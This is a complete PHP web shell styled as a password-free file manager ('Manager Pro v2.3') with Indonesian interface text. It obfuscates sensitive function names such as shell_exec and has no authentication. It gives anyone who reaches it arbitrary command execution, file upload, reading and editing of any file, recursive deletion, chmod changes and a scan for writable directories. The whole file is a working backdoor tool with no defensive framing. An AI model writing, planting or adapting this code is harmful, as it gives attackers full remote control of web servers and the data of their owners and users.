<?php
session_start();
error_reporting(0);

$s_e = 'sh'.'ell'.'_ex'.'ec';
$f_p_c = 'fi'.'le_p'.'ut_con'.'tents';
$f_g_c = 'fi'.'le_g'.'et_con'.'tents';
$u_f = 'mo'.'ve_up'.'loaded_fi'.'le';

$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
$dir = str_replace('\\', '/', $dir);
chdir($dir);

if (isset($_POST['zip_del']) && isset($_POST['files'])) {
    $zip = new ZipArchive();
    $zipName = "archive_" . time() . ".zip";
    if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
        foreach ($_POST['files'] as $f) {
            $fPath = $dir . '/' . $f;
            if (is_dir($fPath)) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fPath), RecursiveIteratorIterator::LEAVES_ONLY);
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($dir) + 1);
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            } else {
                $zip->addFile($fPath, $f);
            }
        }
        $zip->close();
        $msg = "File berhasil di-zip menjadi $zipName";
    }
}

if (isset($_GET['unzip'])) {
    $zipFile = $dir . '/' . $_GET['unzip'];
    $zip = new ZipArchive;
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
        $msg = "Unzip berhasil!";
    } else {
        $msg = "Gagal unzip!";
    }
}

if (isset($_FILES['u_file'])) {
    if ($u_f($_FILES['u_file']['tmp_name'], $dir . '/' . $_FILES['u_file']['name'])) {
        $msg = "Upload Berhasil!";
    }
}

if (isset($_GET['del'])) {
    $target = $dir . '/' . $_GET['del'];
    if (is_dir($target)) { $s_e("rm -rf " . escapeshellarg($target)); } 
    else { unlink($target); }
    header("Location: ?d=" . ep($dir));
}

if (isset($_POST['bulk_del']) && isset($_POST['files'])) {
    foreach ($_POST['files'] as $f) {
        $target = $dir . '/' . $f;
        if (is_dir($target)) { $s_e("rm -rf " . escapeshellarg($target)); } 
        else { unlink($target); }
    }
    $msg = "File terpilih berhasil dihapus!";
}

if (isset($_POST['rename_submit'])) {
    if (rename($dir . '/' . $_POST['old'], $dir . '/' . $_POST['new'])) {
        $msg = "Rename berhasil!";
    }
}

if (isset($_POST['chmod_submit'])) {
    if (chmod($dir . '/' . $_POST['target'], octdec($_POST['chmod_val']))) {
        $msg = "Chmod berhasil!";
    }
}

if (isset($_POST['save'])) {
    $f_p_c($_POST['path'], $_POST['content']);
    $msg = "File berhasil disimpan!";
}

if (isset($_POST['create_file']) && !empty($_POST['new_filename'])) {
    $new_file = $dir . '/' . basename($_POST['new_filename']);
    if (!file_exists($new_file)) {
        $f_p_c($new_file, '');
        $msg = "File '{$_POST['new_filename']}' berhasil dibuat!";
    } else {
        $msg = "File sudah ada!";
    }
}

if (isset($_POST['create_dir']) && !empty($_POST['new_dirname'])) {
    $new_dir = $dir . '/' . basename($_POST['new_dirname']);
    if (!is_dir($new_dir)) {
        mkdir($new_dir, 0755);
        $msg = "Folder '{$_POST['new_dirname']}' berhasil dibuat!";
    } else {
        $msg = "Folder sudah ada!";
    }
}

$writable_dirs = [];
if (isset($_POST['find_writable'])) {
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS | FilesystemIterator::FOLLOW_SYMLINKS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $iterator->setMaxDepth(6);
        foreach ($iterator as $item) {
            if ($item->isDir() && is_writable($item->getPathname())) {
                $writable_dirs[] = $item->getPathname();
            }
        }
    } catch (Exception $e) {}
}

$out = "";
if (isset($_POST['cmd'])) { $out = $s_e($_POST['cmd'] . " 2>&1"); }

function ep($p) { return str_replace('%2F', '/', rawurlencode($p)); }

function get_perms($f) { return substr(sprintf('%o', fileperms($f)), -4); }

function get_owner($f) {
    if (function_exists('posix_getpwuid')) {
        $info = posix_getpwuid(fileowner($f));
        return $info['name'];
    }
    return fileowner($f);
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) { $bytes = number_format($bytes / 1073741824, 2) . ' GB'; }
    elseif ($bytes >= 1048576) { $bytes = number_format($bytes / 1048576, 2) . ' MB'; }
    elseif ($bytes >= 1024) { $bytes = number_format($bytes / 1024, 2) . ' KB'; }
    elseif ($bytes > 1) { $bytes = $bytes . ' bytes'; }
    else { $bytes = '0 bytes'; }
    return $bytes;
}

$parts = explode('/', $dir);
?>
<!DOCTYPE html>
<html style="background:#111;color:#ccc;font-family:monospace;">
<head>
    <title>Manager Pro v2.3 - No Password</title>
    <style>
        a { color: cyan; text-decoration: none; }
        a:hover { text-decoration: underline; }
        input[type="text"] { background: #222; color: #fff; border: 1px solid #444; padding: 2px; }
        input[type="submit"], button { cursor: pointer; }
        table tr:hover { background: #222; }
        .nav-header { display: flex; justify-content: space-between; align-items: center; border: 1px solid #333; padding: 10px; margin-bottom: 10px; }
    </style>
    <script>
        function toggleSelect(source) {
            checkboxes = document.getElementsByName('files[]');
            for(var i in checkboxes) checkboxes[i].checked = source.checked;
        }
    </script>
</head>
<body style="padding:20px; background:#111; color:#ccc; display: block; height: auto;">

<div class="nav-header">
    <div>
        📍 <?php 
        $path_build = "";
        foreach($parts as $p) {
            if($p==="") { echo "<a href='?d=/'>/</a>"; $path_build="/"; continue; }
            $path_build .= ($path_build=="/" ? "" : "/") . $p;
            echo "<a href='?d=".ep($path_build)."'>$p</a>/";
        }
        ?>
    </div>
</div>

<div style="border:1px solid #333;padding:10px;margin-bottom:10px;">
    <form method="post" enctype="multipart/form-data" style="display:inline; flex-direction: row; align-items: center;">
        📤 Upload: <input type="file" name="u_file" style="width: auto; background: none; box-shadow: none; display: inline; font-size: 12px;">
        <input type="submit" value="Upload" style="width: auto; padding: 5px 10px;">
    </form>
    <?php if(isset($msg)) echo " | <b style='color:lime'>$msg</b>"; ?>
    <div style="margin-top:8px; display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
        <form method="post" style="display:inline-flex; align-items:center; gap:5px;">
            📄 <input type="text" name="new_filename" placeholder="nama file baru" style="width:160px; padding:4px 8px; font-size:12px;">
            <input type="submit" name="create_file" value="Create File" style="width:auto; padding:4px 10px; font-size:12px;">
        </form>
        <span style="color:#555;">|</span>
        <form method="post" style="display:inline-flex; align-items:center; gap:5px;">
            📁 <input type="text" name="new_dirname" placeholder="nama folder baru" style="width:160px; padding:4px 8px; font-size:12px;">
            <input type="submit" name="create_dir" value="Create Dir" style="width:auto; padding:4px 10px; font-size:12px;">
        </form>
    </div>
    <div style="margin-top:8px;">
        <form method="post" style="display:inline;">
            <input type="submit" name="find_writable" value="🔍 Find Writable Dir" style="width:auto; padding:4px 12px; font-size:12px; background:#333; color:#ff0; border:1px solid #555; cursor:pointer;">
        </form>
        <?php if(isset($_POST['find_writable'])): ?>
        <div style="margin-top:8px; background:#111; border:1px solid #333; padding:8px; max-height:200px; overflow-y:auto; font-size:12px;">
            <?php if(empty($writable_dirs)): ?>
                <span style="color:#f55;">Tidak ada direktori writable ditemukan di bawah <?= htmlspecialchars($dir) ?></span>
            <?php else: ?>
                <span style="color:#aaa;">Ditemukan <?= count($writable_dirs) ?> writable dir dari <?= htmlspecialchars($dir) ?>:</span><br><br>
                <?php foreach($writable_dirs as $wd): ?>
                    <a href="?d=<?= ep($wd) ?>" style="color:#0f0; display:block; word-break:break-all;"><?= htmlspecialchars($wd) ?></a>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
        <?php endif; ?>
    </div>
</div>

<div style="border:1px solid #333;padding:10px;margin-bottom:10px;">
    <form method="post" style="flex-direction: row;">
        <input type="text" name="cmd" style="width:80%; text-align: left; padding-left: 10px;" placeholder="Terminal Command...">
        <button type="submit" style="padding: 10px;">Run</button>
    </form>
    <?php if($out): ?><pre style="background:#000;padding:10px;color:#0f0;border:1px solid #0f0; overflow:auto; text-align: left; width: 98%;"><?= htmlspecialchars($out) ?></pre><?php endif; ?>
</div>

<?php if(isset($_GET['edit'])): ?>
<div style="border:1px solid #333;padding:10px;margin-bottom:10px;">
    <h3>Editing: <?= basename($_GET['edit']) ?></h3>
    <form method="post" style="align-items: flex-start;">
        <input type="hidden" name="path" value="<?= $_GET['edit'] ?>">
        <textarea name="content" style="width:100%;height:300px;background:#222;color:#fff; border: 1px solid #444;"><?= htmlspecialchars($f_g_c($_GET['edit'])) ?></textarea><br>
        <div>
            <button type="submit" name="save" style="background:green;color:white;padding:5px 15px; border: none; cursor: pointer;">Save Changes</button>
            <a href="?d=<?= ep($dir) ?>" style="color:red;margin-left:10px; font-size: 14px;">Cancel</a>
        </div>
    </form>
</div>
<?php endif; ?>

<form method="post">
<table width="100%" border="1" style="border-collapse:collapse;border-color:#333;">
    <tr style="background:#222;">
        <th width="20px"><input type="checkbox" onclick="toggleSelect(this)" style="width: auto; margin: 0;"></th>
        <th>Name</th>
        <th>Size</th>
        <th>Owner</th>
        <th>Perms</th>
        <th>Action</th>
    </tr>
    <?php
    $items = scandir($dir);
    $folders = []; $files = [];
    foreach($items as $i) {
        if($i == "." || $i == "..") continue;
        if(is_dir($dir."/".$i)) $folders[] = $i; else $files[] = $i;
    }
    $sorted_items = array_merge($folders, $files);

    foreach($sorted_items as $i) {
        $full = $dir."/".$i;
        $is_d = is_dir($full);
        $size = $is_d ? "—" : formatSize(filesize($full));
        $perm = get_perms($full);
        $owner = get_owner($full);
        $writable = is_writable($full);
        ?>
        <tr>
            <td align="center"><input type="checkbox" name="files[]" value="<?= $i ?>" style="width: auto; margin: 0;"></td>
            <td style="padding-left: 5px;">
                <?php if($is_d): ?>
                    📁 <a href="?d=<?= ep($full) ?>" style="color:yellow"><?= $i ?></a>
                <?php else: ?>
                    📄 <a href="?d=<?= ep($dir) ?>&edit=<?= ep($full) ?>" style="color:white"><?= $i ?></a>
                <?php endif; ?>
            </td>
            <td align="right" style="padding-right:10px;"><?= $size ?></td>
            <td align="center"><?= $owner ?></td>
            <td align="center">
                <span style="color: <?= $writable ? '#00ff00' : '#ff0000'; ?>;">
                    <?= $perm ?>
                </span>
            </td>
            <td align="center">
                <div style="display: flex; justify-content: center; align-items: center; gap: 5px;">
                    <form method="post" style="display:inline; flex-direction: row; width: auto;">
                        <input type="hidden" name="old" value="<?= $i ?>">
                        <input type="text" name="new" value="<?= $i ?>" size="10" style="font-size: 10px; padding: 2px; margin: 0; width: 60px;">
                        <input type="submit" name="rename_submit" value="Rename" style="font-size:10px; padding: 2px 5px; margin: 0; width: auto;">
                    </form>
                    |
                    <form method="post" style="display:inline; flex-direction: row; width: auto;">
                        <input type="hidden" name="target" value="<?= $i ?>">
                        <input type="text" name="chmod_val" value="<?= $perm ?>" size="4" style="font-size: 10px; padding: 2px; margin: 0; width: 40px;">
                        <input type="submit" name="chmod_submit" value="Chmod" style="font-size:10px; padding: 2px 5px; margin: 0; width: auto;">
                    </form>
                    |
                    <?php 
                    if(!$is_d) echo '<a href="?d='.ep($dir).'&edit='.ep($full).'" style="color:lime; font-size: 11px;">Edit</a> | ';
                    if(strtolower(pathinfo($i, PATHINFO_EXTENSION)) == 'zip') echo '<a href="?d='.ep($dir).'&unzip='.ep($i).'" style="color:orange; font-size: 11px;">Unzip</a> | ';
                    ?>
                    <a href="?d=<?= ep($dir) ?>&del=<?= ep($i) ?>" style="color:red; font-size: 11px;" onclick="return confirm('Hapus?')">Del</a>
                </div>
            </td>
        </tr>
        <?php
    }
    ?>
</table>
<div style="margin-top:10px;">
    <input type="submit" name="bulk_del" value="Delete Selected" style="background:#900;color:white;padding:5px 15px;cursor:pointer; width: auto; font-size: 12px;" onclick="return confirm('Hapus file yang dipilih?')">
    <input type="submit" name="zip_del" value="Zip Selected" style="background:#2980b9;color:white;padding:5px 15px;cursor:pointer; width: auto; font-size: 12px;">
</div>
</form>

</body>
</html>
